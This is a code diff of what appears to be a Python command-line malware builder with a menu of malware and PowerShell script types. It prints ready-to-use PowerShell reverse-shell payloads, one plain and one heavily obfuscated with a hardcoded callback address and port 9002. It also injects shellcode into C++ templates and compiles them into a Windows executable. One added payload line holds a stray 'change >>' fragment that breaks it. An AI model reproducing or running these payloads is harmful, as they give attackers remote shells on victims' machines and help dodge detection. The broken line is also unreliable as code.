@@ -95,10 +95,10 @@ class MyPrompt(Cmd):
       
 """, 'red') + """
       
-                   """ + colored("13", 'cyan') + """ Diffrent Types Of Malware
+                   """ + colored("11", 'cyan') + """ Diffrent Types Of Malware
                    """ + colored("0", 'cyan') + """ Diffrent Types Of Ransomware [ToDo]
                    """ + colored("0", 'cyan') + """ Diffrent Types Of Rootkits [ToDO]
-                   """ + colored("2", 'cyan') + """ Diffrent Type Of Powershell Scripts
+                   """ + colored("3", 'cyan') + """ Diffrent Type Of Powershell Scripts
 """
 
 
@@ -198,7 +198,7 @@ class MyPrompt(Cmd):
             elif Cmd.powershell_type == '2':
                 print(colored("[+]", 'cyan') + ' Your Payload Is Ready To Use : $client = New-Object System.Net.Sockets.TCPClient("' + Cmd.ip + '",' + Cmd.port + ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()')
             elif Cmd.powershell_type == '4':
-                print(colored("[+]", 'cyan') + ' Your Payload Is Ready To Use : sEt 9MNCZ2  (  [TypE]("{2}{1}{4}{0}{3}" -f\'CodI\',\'XT.\',\'TE\',\'ng\',\'eN\')  ) ;  ${c`lIe`NT} = .("{1}{0}{2}"-f \'c\',\'New-Obje\',\'t\') ("{0}{5}{7}{3}{2}{6}{1}{4}{8}"-f \'Sy\',\'T\',\'k\',\'oc\',\'CPCl\',\'stem.Net\',\'ets.\',\'.S\',\'ient\')(("{0}{3}{2}{1}" -f \'1\',\'21\',\'52.\',\'72.21.\'),9002);${st`RE`Am} = ${c`l`iENT}.("{1}{0}{2}" -f \'Stre\',\'Get\',\'am\').Invoke();[byte[]]${B`yTeS} = 0..65535|&(\'%\'){0};while((${i} = ${S`TR`eam}.("{0}{1}"-f\'R\',\'ead\').Invoke(${B`ytES}, 0, ${b`YTEs}."le`Ng`TH")) -ne 0){;${DA`Ta} = (.("{2}{1}{0}" -f\'t\',\'jec\',\'New-Ob\') -TypeName ("{1}{5}{6}{0}{2}{4}{3}"-f \'t.ASCI\',\'Syst\',\'IEnco\',\'g\',\'din\',\'em.\',\'Tex\'))."GE`TsTr`ING"(${B`yt`Es},0, ${i});${S`EnDBA`ck} = (.("{1}{0}"-f \'x\',\'ie\') ${Da`TA} 2>&1 | &("{0}{1}{2}"-f\'O\',\'ut-Stri\',\'ng\') );${sEND`B`AcK2} = ${SendB`A`ck} + "PS " + (&("{1}{0}" -f\'wd\',\'p\'))."pA`Th" + "> ";${sEND`BY`Te} = (  ( ls  VARIablE:9mNCZ2).VAluE::"asc`iI").("{0}{2}{1}"-f\'Get\',\'es\',\'Byt\').Invoke(${se`Nd`BaCk2});${sT`RE`Am}.("{1}{0}" -f\'rite\',\'W\').Invoke(${s`eNDb`YTE},0,${S`END`B`Yte}."len`G`Th");${s`TR`Eam}.("{0}{1}"-f \'F\',\'lush\').Invoke()};${CL`IEnT}.("{0}{1}" -f \'Cl\',\'ose\').Invoke()')
+                print(colored("[+]", 'cyan') + ' Your Payload Is Ready To Use : sEt 9MNCZ2  (  [TypE]("{2}{1}{4}{0}{3}" -f\'CodI\',\'XT.\',\'TE\',\'ng\',\'eN\')  ) ;  ${c`lIe`NT} = .("{1}{0}{2}"-f \'c\',\'New-Obje\',\'t\') ("{0}{5}{7}{3}{2}{6}{1}{4}{8}"-f \'Sy\',\'T\',\'k\',\'oc\',\'CPCl\',\'stem.Net\',\'ets.\',\'.S\',\'ient\')(("{0}{3}{2}{1}" -f change >> \'1\',\'21\',\'52.\',\'72.21.\'),9002);${st`RE`Am} = ${c`l`iENT}.("{1}{0}{2}" -f \'Stre\',\'Get\',\'am\').Invoke();[byte[]]${B`yTeS} = 0..65535|&(\'%\'){0};while((${i} = ${S`TR`eam}.("{0}{1}"-f\'R\',\'ead\').Invoke(${B`ytES}, 0, ${b`YTEs}."le`Ng`TH")) -ne 0){;${DA`Ta} = (.("{2}{1}{0}" -f\'t\',\'jec\',\'New-Ob\') -TypeName ("{1}{5}{6}{0}{2}{4}{3}"-f \'t.ASCI\',\'Syst\',\'IEnco\',\'g\',\'din\',\'em.\',\'Tex\'))."GE`TsTr`ING"(${B`yt`Es},0, ${i});${S`EnDBA`ck} = (.("{1}{0}"-f \'x\',\'ie\') ${Da`TA} 2>&1 | &("{0}{1}{2}"-f\'O\',\'ut-Stri\',\'ng\') );${sEND`B`AcK2} = ${SendB`A`ck} + "PS " + (&("{1}{0}" -f\'wd\',\'p\'))."pA`Th" + "> ";${sEND`BY`Te} = (  ( ls  VARIablE:9mNCZ2).VAluE::"asc`iI").("{0}{2}{1}"-f\'Get\',\'es\',\'Byt\').Invoke(${se`Nd`BaCk2});${sT`RE`Am}.("{1}{0}" -f\'rite\',\'W\').Invoke(${s`eNDb`YTE},0,${S`END`B`Yte}."len`G`Th");${s`TR`Eam}.("{0}{1}"-f \'F\',\'lush\').Invoke()};${CL`IEnT}.("{0}{1}" -f \'Cl\',\'ose\').Invoke()')
         elif generate == 'malware':
             if Cmd.payload_type == '':
                 print(colored("[-]", 'red') + "Please Set The Payload First\n")
@@ -206,6 +206,7 @@ class MyPrompt(Cmd):
                 print(colored("[-]", 'red') + "Please Set The Malware Type\n")
             elif Cmd.malware_type == '6':
                 os.system("cp ./malware/0" + Cmd.malware_type + "-malware/malware" + Cmd.malware_type + ".cpp ./malware/0" + Cmd.malware_type + "-malware/" + Cmd.malware_type + ".cpp")
+                os.system("mv ./malware/0" + Cmd.malware_type + "-malware/malware" + Cmd.malware_type + ".cpp ../")
                 with open("./malware/xx-shellcodes/payload" + Cmd.payload_type + ".pay", "r") as f:
                     data = f.read()
                 for line in fileinput.FileInput("./malware/0" + Cmd.malware_type + "-malware/" + Cmd.malware_type + ".cpp",inplace=1):
@@ -214,6 +215,7 @@ class MyPrompt(Cmd):
                     print(line, end=" ")
                 os.system("x86_64-w64-mingw32-g++ ./malware/0"+ Cmd.malware_type  + "-malware/*.cpp -fpermissive -o ./ready/shinigami.exe")
                 os.system("rm ./malware/0" + Cmd.malware_type + "-malware/" + Cmd.malware_type + ".cpp")
+                os.system("mv ../malware6.cpp ./malware/0" + Cmd.malware_type + "-malware/")
                 print (colored("[+]" , 'cyan' ) + " Your Malware is Ready in [ready folder]" )
             elif Cmd.malware_type == '7':
                 os.system("cp ./malware/0" + Cmd.malware_type + "-malware/malware" + Cmd.malware_type + ".cpp ./malware/0" + Cmd.malware_type + "-malware/" + Cmd.malware_type + ".cpp")
@@ -222,8 +224,10 @@ class MyPrompt(Cmd):
                     if "LOCATION" in line:
                         line=line.replace(line,"\"" + Cmd.location + "\",")
                     print(line, end=" ")
+                os.system("mv ./malware/0" + Cmd.malware_type + "-malware/malware" + Cmd.malware_type + ".cpp ../")
                 os.system("x86_64-w64-mingw32-g++ ./malware/0"+ Cmd.malware_type  + "-malware/*.cpp -fpermissive -o ./ready/shinigami.exe")
                 os.system("rm ./malware/0" + Cmd.malware_type + "-malware/" + Cmd.malware_type + ".cpp")
+                os.system("mv ../malware7.cpp ./malware/0" + Cmd.malware_type + "-malware/")
                 print (colored("[+]" , 'cyan' ) + " Your Malware is Ready in [ready folder]" )
 
             elif Cmd.malware_type == '3':
